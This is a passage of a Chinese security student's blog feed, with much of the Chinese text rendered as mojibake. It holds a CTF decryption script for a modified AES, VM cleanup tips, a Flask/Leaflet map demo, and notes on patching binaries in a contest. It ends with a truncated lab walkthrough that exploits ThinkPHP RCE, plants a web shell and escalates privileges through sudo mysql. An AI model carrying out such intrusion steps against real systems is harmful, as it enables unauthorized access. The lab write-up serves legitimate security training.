class="hljs-number">0xFD</span>]<br><br><span class="hljs-comment"># æ„é€ é€† S-box</span><br>new_contrary_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    val = new_s_box[i]<br>    new_contrary_sbox[val] = i<br><br><span class="hljs-comment"># æ›¿æ¢ key</span><br>Cipher_Key = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0xed</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x0a</span>,<br>    <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xb7</span>,<br>    <span class="hljs-number">0x74</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xd4</span><br>])<br><br><span class="hljs-comment"># è§£å¯†</span><br>aes = IAES()<br>plaintext = aes.IAES(cipher_bytes, Cipher_Key, new_contrary_sbox)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ“ æ˜æ–‡æ–‡æœ¬ï¼š&quot;</span>, plaintext.decode(<span class="hljs-string">&quot;utf-8&quot;</span>, errors=<span class="hljs-string">&quot;replace&quot;</span>))<br><br><span class="hljs-comment">#3a7e1d9c0b8f4e56</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
      <tag>aesé­”æ”¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‡å°‘è™šæ‹Ÿæœºå çš„ç‰©ç†å†…å­˜</title>
    <link href="/2025/03/25/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A0%E7%9A%84%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98/"/>
    <url>/2025/03/25/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A0%E7%9A%84%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h1><h2 id="drag-and-drop"><a href="#drag-and-drop" class="headerlink" title="drag_and_drop"></a>drag_and_drop</h2><p>ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´å€¼å€ŸåŠ©vmware toolsæ’ä»¶æ¥è¿›è¡Œæ–‡ä»¶å¤åˆ¶ï¼Œå…¶å·¥ä½œåŸç†æ˜¯æ¯ä¸€æ¬¡å¤åˆ¶æ–‡ä»¶ï¼Œéƒ½ä¼šåœ¨~&#x2F;.cacheæ–‡ä»¶å¤¹é‡Œé¢ç”Ÿæˆä¸€ä¸ªåŒæ ·çš„æ–‡ä»¶ï¼Œå†ä½¿ç”¨cpæ‹·è´çš„æ–¹å¼å°†å…¶æ‹·è´åˆ°å¤åˆ¶æ”¾ç½®çš„ç›®å½•ä¸­</p><p>du -sh &#x2F;home&#x2F;kali&#x2F;.cache&#x2F;vmware&#x2F;drag_and_dropï¼šè®¡ç®—å¤§å°</p><p>rm -rf &#x2F;home&#x2F;kali&#x2F;.cache&#x2F;vmware&#x2F;drag_and_drop</p><h2 id="debå®‰è£…åŒ…"><a href="#debå®‰è£…åŒ…" class="headerlink" title="debå®‰è£…åŒ…"></a>debå®‰è£…åŒ…</h2><p>sudo apt-get install å‘½ä»¤å®‰è£…è½¯ä»¶åŒ…åï¼Œå®‰è£…åŒ…åœ¨ &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives ç›®å½•ä¸‹</p><p>du -sh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives</p><p>sudo apt-get clean</p><p>sudo apt-get autoclean</p><h1 id="å‹ç¼©è™šæ‹Ÿæœº"><a href="#å‹ç¼©è™šæ‹Ÿæœº" class="headerlink" title="å‹ç¼©è™šæ‹Ÿæœº"></a>å‹ç¼©è™šæ‹Ÿæœº</h1><p>ä¸‹é¢æ–¹æ³•å¯ä»¥å¤§å¹…å‡å°‘è™šæ‹Ÿæœºæ‰€å ç‰©ç†å†…å­˜</p><p><a href="https://blog.csdn.net/feidrang/article/details/127490921">https://blog.csdn.net/feidrang/article/details/127490921</a></p><p>æœ‰ä¸ªé—®é¢˜æ˜¯åœ¨è™šæ‹Ÿæœºé‡Œé¢åˆ é™¤dockeræˆ–è€…æ–‡ä»¶å¹¶ä¸ä¼šå‡å°‘è™šæ‹Ÿæœºå çš„ç‰©ç†å†…å­˜ï¼Œå› æ­¤éœ€è¦å‹ç¼©è™šæ‹Ÿæœºæ¥é‡æ–°é‡Šæ”¾å†…å­˜ï¼Œä½†æ˜¯å‹ç¼©ä¹‹å‰éœ€è¦åˆ é™¤å…¨éƒ¨å¿«ç…§ï¼Œæ‰€ä»¥å»ºè®®æå‰å¤‡ä»½è™šæ‹Ÿæœº</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäºLeafletæ¡†æ¶çš„åœ¨çº¿åœ°å›¾</title>
    <link href="/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/"/>
    <url>/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p>æ˜¨æ™šå’Œé«˜ä¸­åŒå­¦èŠèµ·webç«¯åœ°å›¾ï¼Œäºæ˜¯çªå‘å¥‡æƒ³å€ŸåŠ©aiå’Œæ¡†æ¶åšä¸€ä¸ªç®€æ˜“çš„ç³»ç»Ÿï¼Œä»¥æ­¤è¯å®å¦‚ä»Šaiçš„å¼ºå¤§</p><p>é¡¹ç›®ç»“æ„å¦‚ä¸‹</p><img src="/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/1742556436163-1171a43c-d771-4f7b-b6bc-c681cb2b8e72.png" class="" title="img"><p>app.pyç”¨æœ€å…¸å‹çš„Flaskæ¡†æ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, jsonify<br><br>app = Flask(__name__)<br><br>mock_data = [<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;æ ‡æ³¨ç‚¹ A&quot;</span>,<br>        <span class="hljs-string">&quot;lat&quot;</span>: <span class="hljs-number">39.9042</span>,   <span class="hljs-comment"># åŒ—äº¬ç¤ºä¾‹åæ ‡</span><br>        <span class="hljs-string">&quot;lng&quot;</span>: <span class="hljs-number">116.4074</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;æ ‡æ³¨ç‚¹ B&quot;</span>,<br>        <span class="hljs-string">&quot;lat&quot;</span>: <span class="hljs-number">31.2304</span>,   <span class="hljs-comment"># ä¸Šæµ·ç¤ºä¾‹åæ ‡</span><br>        <span class="hljs-string">&quot;lng&quot;</span>: <span class="hljs-number">121.4737</span><br>    &#125;<br>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;è¿”å›ä¸»é¡µé¢&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/locations&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_locations</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;è¿”å›åœ°ç†æ•°æ®ï¼ˆJSONï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> jsonify(mock_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥ç”¨Leaflet èµ„æºçš„è¯ä¼šæ˜¾ç¤ºintegrityæ ¡éªŒå¤±è´¥ï¼Œäºæ˜¯ä¸ä½¿ç”¨ integrityç­‰å±æ€§</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>åœ°å›¾æ¼”ç¤ºé¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥ Leaflet CSS (ä¸ä½¿ç”¨ integrity å’Œ crossorigin å±æ€§) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span></span><br><span class="hljs-tag">      <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://unpkg.com/leaflet@1.9.3/dist/leaflet.css&quot;</span></span><br><span class="hljs-tag">      /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;style.css&#x27;) &#125;&#125;&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>åœ°å›¾æ¼”ç¤ºé¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;map-section&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- åœ°å›¾å®¹å™¨ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;map&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Â© 2025 åœ°å›¾æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥ Leaflet JS (ä¸ä½¿ç”¨ integrity å’Œ crossorigin å±æ€§) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span></span><br><span class="hljs-tag">      <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/leaflet@1.9.3/dist/leaflet.js&quot;</span></span><br><span class="hljs-tag">      &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥ä¸»é€»è¾‘è„šæœ¬ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;main.js&#x27;) &#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>const map = L.map(&#x27;map&#x27;).setView([34, 108], 5);<br><br>// è®¾ç½® OpenStreetMap ç“¦ç‰‡å±‚<br>L.tileLayer(&#x27;https://&#123;s&#125;.tile.openstreetmap.org/&#123;z&#125;/&#123;x&#125;/&#123;y&#125;.png&#x27;, &#123;<br>  attribution: &#x27;Â© OpenStreetMap&#x27;,<br>  maxZoom: 19,<br>&#125;).addTo(map);<br><br>// ä»åç«¯è·å–åœ°ç†æ•°æ®<br>fetch(&#x27;/api/locations&#x27;)<br>  .then(response =&gt; response.json())<br>  .then(data =&gt; &#123;<br>    data.forEach(item =&gt; &#123;<br>      // ä¸ºæ¯ä¸ªåœ°ç‚¹æ·»åŠ ä¸€ä¸ªæ ‡æ³¨ç‚¹<br>      const marker = L.marker([item.lat, item.lng]).addTo(map);<br>      // ä¸ºæ ‡æ³¨ç‚¹æ·»åŠ å¼¹å‡ºæ¡†æ˜¾ç¤ºåç§°å’Œåæ ‡<br>      marker.bindPopup(`<span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>$&#123;item.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>åæ ‡: $&#123;item.lat&#125;, $&#123;item.lng&#125;`);<br>    &#125;);<br>  &#125;)<br>  .catch(error =&gt; &#123;<br>    console.error(&quot;è·å–æ ‡æ³¨ç‚¹æ•°æ®å¤±è´¥:&quot;, error);<br>  &#125;);<br>body &#123;<br>  margin: 0;<br>  padding: 0;<br>  font-family: &quot;Microsoft YaHei&quot;, Arial, sans-serif;<br>  background-color: #fafafa;<br>&#125;<br><br>header, footer &#123;<br>  text-align: center;<br>  background-color: #333;<br>  color: #fff;<br>  padding: 12px 0;<br>&#125;<br><br>h1 &#123;<br>  margin: 0;<br>  font-size: 24px;<br>&#125;<br><br>/* åœ°å›¾æ‰€åœ¨å®¹å™¨ */<br>#map-section &#123;<br>  width: 100%;<br>  height: calc(100vh - 120px); /* é™¤å» header/footer çš„é«˜åº¦ */<br>  position: relative;<br>&#125;<br><br>/* Leaflet åœ°å›¾å¿…é¡»æ˜¾å¼è®¾ç½®é«˜åº¦æ‰èƒ½æ˜¾ç¤º */<br>#map &#123;<br>  width: 100%;<br>  height: 100%;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœ</p><img src="/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/1742556736492-e2d43f08-2021-41e0-807a-c2d3821d5cf8.png" class="" title="img"><p>åœ¨å¤§æ¨¡å‹æ™®åŠçš„ä»Šå¤©ï¼ŒåŸæ¥å¯èƒ½éœ€è¦å‡ å¤©çš„æ—¶é—´æ¥å­¦ä¹ å¼€å‘ç›¸å…³çŸ¥è¯†ï¼Œç°åœ¨åªéœ€è¦åŠå°æ—¶å°±èƒ½å®ŒæˆåŸºç¡€å¼€å‘ï¼Œå®åœ¨ä»¤äººéœ‡æƒŠã€‚å¤§æ¨¡å‹åœ¨å¸¦ç»™æˆ‘ä»¬è¯¸å¤šä¾¿åˆ©çš„åŒæ—¶ä¹Ÿç»™æˆ‘å¸¦æ¥ä¸€äº›æ€è€ƒï¼šåº”è¯¥å¦‚ä½•æŠµå¾¡aiæµªæ½®çš„å†²å‡»ï¼Œæ‰¾åˆ°è‡ªå·±è¾ƒä¸ºæ»¡æ„çš„å·¥ä½œï¼Ÿç›®å‰çœ‹æ¥è¾©è¯çœ‹å¾…aiç»™å‡ºçš„ç»“æœå’ŒæŒç»­å­¦ä¹ åº”è¯¥æ˜¯ä¸é”™çš„é€‰æ‹©ï¼ŒåŠ æ²¹å§å°‘å¹´</p>]]></content>
    
    
    <categories>
      
      <category>ä½œä¸šä¸é¡¹ç›®æ€»ç»“</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025ciscn&amp;ccbæµ™æ±Ÿèµ›åŒºåŠå†³èµ›</title>
    <link href="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¹´èµ›é¢˜å¼ºåº¦å¾ˆé«˜ï¼Œwebä¸€é“fixäºŒåå¤šè§£ï¼Œå…¶ä»–é¢˜attackå’Œfixåº”è¯¥éƒ½æ˜¯ä¸ªä½æ•°è§£ï¼›pwnä¸€é“fix60è§£ï¼Œä¸€é“30è§£ï¼Œè¿˜æœ‰ä¸¤é“ä¸ªä½æ•°è§£ã€‚æ¸—é€é˜Ÿå‹è¿˜æ˜¯å¾ˆå¼ºçš„ï¼Œæœ€åå–œæäºŒç­‰å®‰æ…°å¥–</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwnçš„é™„ä»¶æœ‰ä¸€é“æ˜¯web-pwnï¼Œä¸çŸ¥é“äºŒè¿›åˆ¶æ–‡ä»¶åœ¨å“ªï¼Œå…¶ä»–é¢˜ç›®ä¹Ÿä¸æ˜¯uafï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç­‰æ˜æ˜¾çš„æ¼æ´ï¼Œæˆ‘å°±fixäº†ä¸¤é“ï¼Œ30è§£çš„é¢˜10æ¬¡ç”¨å®Œä¹Ÿæ²¡fixå‡ºæ¥</p><h2 id="Quantum"><a href="#Quantum" class="headerlink" title="Quantum"></a>Quantum</h2><p>è¿™é‡Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä½†æ˜¯æ²¡ç”¨</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124596790-9c94d027-9cb5-46ab-9afc-cc9dab5d0ce7.png" class="" title="img"><p>æŠŠ0x20æ”¹æˆ8</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124600547-4d808d3d-ad60-4531-a5df-947c760e87c4.png" class="" title="img"><p>ç„¶åæŠŠfreeä¸‹é¢çš„ä¸€è¡Œnopæ‰</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124605846-d3859971-bb04-412d-aee1-b5c38094d811.png" class="" title="img"><p>æ²¡æƒ³åˆ°è¿™é¢˜è¿™ä¹ˆå¥½é˜²ï¼Œè¿˜æ˜¯é˜²æ…¢äº†</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124612247-21474968-e066-4aa5-b7a9-d2d184ec0246.png" class="" title="img"><h2 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h2><p>æŠŠ0x500æ”¹æˆ0x100ï¼Œè¿™æ ·å°±é™åˆ¶äº†large binä¹‹ç±»çš„</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125325929-8dfa2f72-8bec-434b-84a6-c885bb4ce699.png" class="" title="img"><p>æŠŠfreeä¸‹é¢ä¸€è¡Œï¼ˆå¯èƒ½çš„offbyone nopï¼‰æ‰</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125329668-a8ad1c3e-7b64-4dc1-a46e-36638a60edef.png" class="" title="img"><p>æŠŠ0x1000æ”¹æˆ0x100</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125334668-cd321d24-fec3-4875-850e-ca898f60e006.png" class="" title="img"><p>ä¿®äº†åŠå¤©æ‰ä¿®å‡ºæ¥ï¼Œä¹‹å‰æ„Ÿè§‰ä¹Ÿæ˜¯è¿™æ ·çš„æ€è·¯ï¼Œå¤§æ¦‚ç‡æ˜¯ç¬¬ä¸€çœ¼æ²¡çœ‹åˆ°ç†Ÿæ‚‰çš„æ¼æ´å°±æ‡µé€¼äº†</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125340813-3e40145f-f24a-4ce6-82f3-1759dd2eecb6.png" class="" title="img"><h2 id="Typo-2"><a href="#Typo-2" class="headerlink" title="Typo-2"></a>Typo-2</h2><p>å°è¯•æŠŠ+8æ”¹æˆ+0ï¼Œ0x200æ”¹æˆ0x120ï¼Œæ˜¾ç¤ºåˆ©ç”¨å¤±è´¥ï¼Œæ”¹æˆ0x80æˆ–è€…0x78å¥½åƒè¿‡åº¦é˜²å¾¡äº†</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125127623-a44638fa-db5a-47af-9927-d027cd01841c.png" class="" title="img"><p>æœ€åæ¬¡æ•°ç”¨å®Œäº†ä¹Ÿæ˜¯æ²¡fixï¼Œå‘œå‘œä¸çŸ¥é“ä¸ºå•¥</p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awdp_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œinitial wp</title>
    <link href="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/"/>
    <url>/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://exp10it.io/2023/07/chunqiuyunjing-initial-writeup/#flag01">https://exp10it.io/2023/07/chunqiuyunjing-initial-writeup/#flag01</a></p><p><a href="https://t1ng-t1ng.github.io/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/">https://t1ng-t1ng.github.io/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</a></p><p>39.98.121.251æ˜¯é˜Ÿå‹ç§Ÿçš„ä¸€ä¸ªè…¾è®¯äº‘æœåŠ¡å™¨ï¼Œç›¸å½“äºæŒ‚äº†ä¸€å±‚ä»£ç†</p><h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>å…¥å£ç‚¹æ˜¯172.22.1.15</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529838121-fbda0487-573c-4305-ba29-f8bfa6e2553d.png" class="" title="img"><p>fscanæ‰«æå¾—åˆ°å¸¸è§ç«¯å£ï¼Œæ‰«ä¸å‡ºæ¥çš„è¯å†ç”¨nmap</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513725508-711e53d4-f2d9-493f-a1e9-56df12522069.png" class="" title="img"><p>æ‰¾å¯¹åº”çš„poc</p><p><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a></p><p>ä¿®æ”¹hostä¹‹åå‘ç°å“åº”æ˜¯500</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529152731-e41719d1-4bb2-4036-ae8b-34738f6d46f6.png" class="" title="img"><p>è¿™é‡Œæ²¡æœ‰å…³ç³»ç»§ç»­å¾€ä¸‹</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513839637-84367169-43bd-46ca-a47b-e08684d904b6.png" class="" title="img"><p>ç„¶åå†™shell.phpèšå‰‘è¿æ¥</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515629106-7a1defec-91cd-44f4-b9ed-0496988b18d1.png" class="" title="img"><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>ï¼šæ‰¾åˆ°ç³»ç»Ÿä¸­æ‰€æœ‰ç”± root æ‹¥æœ‰å¹¶å¸¦æœ‰ SUID ä½çš„æ–‡ä»¶ï¼ŒSUIDæŒ‡ç”¨æˆ·åœ¨æ‰§è¡Œç¨‹åº&#x2F;å‘½ä»¤çš„æ—¶å€™ï¼Œå°†è·å–æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼Œè¿™é‡Œsuidä¸å¯åˆ©ç”¨</p><p>å°è¯•sudoææƒï¼Œå‘ç°mysqlæœ‰rootæƒé™</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515424108-60afdc0d-35d5-49e7-8080-d6685dcadb0c.png" class="" title="img"><p><a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a><img 